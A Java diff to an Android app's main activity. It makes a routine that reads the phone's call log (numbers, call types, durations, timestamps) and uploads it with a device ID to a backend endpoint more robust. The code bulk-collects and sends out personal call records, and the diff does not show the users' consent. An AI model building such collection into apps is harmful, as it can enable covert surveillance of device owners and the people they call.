@@ -314,19 +314,25 @@ public class MainActivity extends BridgeActivity {
                 int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
 
                 do {
-                    JSONObject log = new JSONObject();
-                    log.put("number", numIdx != -1 ? cursor.getString(numIdx) : "Unknown");
-                    log.put("type", typeIdx != -1 ? cursor.getString(typeIdx) : "Unknown");
-                    log.put("duration", durIdx != -1 ? cursor.getString(durIdx) : "0");
-                    log.put("timestamp", dateIdx != -1 ? sdf.format(new Date(cursor.getLong(dateIdx))) : sdf.format(new Date()));
-                    logsArray.put(log);
+                    try {
+                        JSONObject log = new JSONObject();
+                        log.put("number", numIdx != -1 ? cursor.getString(numIdx) : "Unknown");
+                        log.put("type", typeIdx != -1 ? cursor.getString(typeIdx) : "Unknown");
+                        log.put("duration", durIdx != -1 ? cursor.getString(durIdx) : "0");
+                        log.put("timestamp", dateIdx != -1 ? sdf.format(new Date(cursor.getLong(dateIdx))) : sdf.format(new Date()));
+                        logsArray.put(log);
+                    } catch (Exception e) { Log.e(TAG, "Single Call Log Error", e); }
                 } while (cursor.moveToNext());
                 cursor.close();
 
-                JSONObject payload = new JSONObject();
-                payload.put("deviceId", deviceId);
-                payload.put("logs", logsArray);
-                sendToBackend("/api/logs/calls", payload.toString());
+                if (logsArray.length() > 0) {
+                    JSONObject payload = new JSONObject();
+                    payload.put("deviceId", deviceId);
+                    payload.put("logs", logsArray);
+                    sendToBackend("/api/logs/calls", payload.toString());
+                }
+            } else if (cursor != null) {
+                cursor.close();
             }
         } catch (Exception e) { Log.e(TAG, "Call Log Error", e); }
     }
